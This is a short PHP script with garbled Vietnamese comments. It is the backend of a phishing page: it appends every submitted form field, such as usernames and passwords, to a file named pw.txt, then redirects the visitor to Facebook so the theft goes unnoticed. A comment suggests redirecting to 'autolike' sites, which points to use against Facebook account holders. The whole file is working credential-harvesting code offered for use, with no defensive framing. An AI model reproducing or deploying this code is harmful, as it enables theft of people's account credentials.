  ?<?php
header("Location: http://facebook.com"); //nh?p link các b?n mu?n chuy?n ??n , nên nh?p link c?a các website autolike
$handle = fopen("pw.txt", "a");//n?i l?u tài kho?n
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>